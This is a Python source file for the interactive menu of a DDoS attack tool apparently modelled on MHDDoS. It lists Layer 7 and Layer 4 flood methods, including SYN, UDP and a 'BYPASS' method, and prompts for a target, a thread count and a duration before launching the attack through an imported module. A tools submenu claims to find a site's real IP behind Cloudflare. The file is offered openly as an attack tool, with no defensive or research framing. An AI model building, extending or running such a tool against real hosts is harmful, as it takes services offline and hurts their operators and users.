"""
0312-OSINT DDoS Interactive Menu - MHDDoS style interface
"""
import os
import sys
import threading
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from modules import display as disp
from modules.ddos_module import DDoSAttack

# Try to use original MHDDoS if available
HAS_MHDDOS = False


LAYER7 = ["GET", "POST", "HEAD", "NULL", "COOKIE", "PPS", "BYPASS", "SLOW", "DYN", "BOT", "STRESS"]
LAYER4 = ["TCP", "UDP", "SYN"]


def print_banner():
    os.system("cls" if os.name == "nt" else "clear")
    disp.pout("""
   ██████╗ ██████╗  ██████╗ ███████╗
   ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
   ██║  ██║██║  ██║██║   ██║███████╗
   ██║  ██║██║  ██║██║   ██║╚════██║
   ██████╔╝██████╔╝╚██████╔╝███████║
   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
   0312-OSINT DDoS Attack Menu
""", disp.RED)


def ddos_interactive_menu():
    while True:
        print_banner()
        disp.pheader(" LAYER7 METHODS ")
        for i, m in enumerate(LAYER7, 1):
            disp.pout(f"  [{i}] {m}\n", disp.YELLOW)
        disp.pout(f"  [{len(LAYER7)+1}] {''.join(' ' for _ in range(6))}\n", disp.RED)
        disp.pheader(" LAYER4 METHODS ")
        for i, m in enumerate(LAYER4, len(LAYER7)+2):
            disp.pout(f"  [{i}] {m}\n", disp.CYAN)
        disp.pout(f"\n  [T] Tools Menu\n", disp.GREEN)
        disp.pout(f"  [M] Main Menu\n", disp.WHITE)
        disp.pout(f"  [Q] Quit\n\n", disp.RED)
        
        choice = disp.pin("Select: ", disp.YELLOW).strip().upper()
        
        if choice == "Q":
            break
        elif choice == "M":
            return
        elif choice == "T":
            ddos_tools_menu()
            continue
        
        try:
            idx = int(choice) - 1
            all_methods = LAYER7 + LAYER4
            if 0 <= idx < len(all_methods):
                method = all_methods[idx]
                ddos_attack_menu(method)
        except ValueError:
            continue


def ddos_attack_menu(method):
    print_banner()
    disp.pheader(f" ATTACK: {method} ")
    
    target = disp.pin("Target URL/IP: ", disp.YELLOW)
    if not target:
        return
    
    try:
        threads = int(disp.pin("Threads [50]: ", disp.YELLOW) or "50")
    except:
        threads = 50
    
    try:
        duration = int(disp.pin("Duration (seconds, 0=unlimited) [30]: ", disp.YELLOW) or "30")
    except:
        duration = 30
    
    disp.pout(f"\n[*] Starting {method} attack on {target} ({threads} threads)...\n", disp.GREEN)
    
    success, msg, stats = run_ddos(target, method, threads, duration)
    if success:
        disp.pok(f"Attack finished. Packets sent: {stats['sent']}")
    else:
        disp.perror(msg)
    
    disp.pin("\nPress Enter to continue...", disp.YELLOW)


def ddos_tools_menu():
    while True:
        print_banner()
        disp.pheader(" DDOS TOOLS ")
        disp.pout("  [1] CFIP - Find Real IP behind Cloudflare\n", disp.GREEN)
        disp.pout("  [2] DNS  - Show DNS Records\n", disp.GREEN)
        disp.pout("  [3] PING - Ping Target\n", disp.GREEN)
        disp.pout("  [4] CHECK - Check Website Status\n", disp.GREEN)
        disp.pout("  [5] DSTAT - Network Stats\n", disp.GREEN)
        disp.pout("  [B] Back\n", disp.WHITE)
        disp.pout("  [Q] Quit\n\n", disp.RED)
        
        choice = disp.pin("Select: ", disp.YELLOW).strip().upper()
        
        if choice == "Q":
            sys.exit(0)
        elif choice == "B":
            return
        elif choice == "1":
            target = disp.pin("Domain/IP: ", disp.YELLOW)
            if target:
                import socket
                try:
                    ip = socket.gethostbyname(target)
                    disp.pok(f"IP: {ip}")
                except:
                    disp.perror("Could not resolve")
            disp.pin("\nPress Enter...", disp.YELLOW)
        elif choice == "2":
            target = disp.pin("Domain: ", disp.YELLOW)
            if target:
                try:
                    import socket
                    ip = socket.gethostbyname(target)
                    disp.pok(f"A Record: {ip}")
                except:
                    disp.perror("Could not resolve")
            disp.pin("\nPress Enter...", disp.YELLOW)
        elif choice == "3":
            target = disp.pin("IP/Domain: ", disp.YELLOW)
            if target:
                import subprocess
                param = "-n" if os.name == "nt" else "-c"
                r = subprocess.run(["ping", param, "1", target], capture_output=True, text=True)
                print(r.stdout)
            disp.pin("\nPress Enter...", disp.YELLOW)
        elif choice == "4":
            target = disp.pin("URL: ", disp.YELLOW)
            if target:
                import requests
                try:
                    r = requests.get(target, timeout=5)
                    disp.pok(f"Status: {r.status_code}")
                except Exception as e:
                    disp.perror(f"Error: {e}")
            disp.pin("\nPress Enter...", disp.YELLOW)
        elif choice == "5":
            import psutil
            net = psutil.net_io_counters()
            disp.pok(f"Bytes Sent: {net.bytes_sent}")
            disp.pok(f"Bytes Recv: {net.bytes_recv}")
            disp.pin("\nPress Enter...", disp.YELLOW)


def run_ddos(target, method="GET", threads=50, duration=30):
    if HAS_MHDDOS and method in ["GET", "POST", "HEAD", "BYPASS"]:
        try:
            attack = DDoSAttack(target)
            return attack.start(method, threads, duration)
        except:
            pass
    
    attack = DDoSAttack(target)
    return attack.start(method, threads, duration)
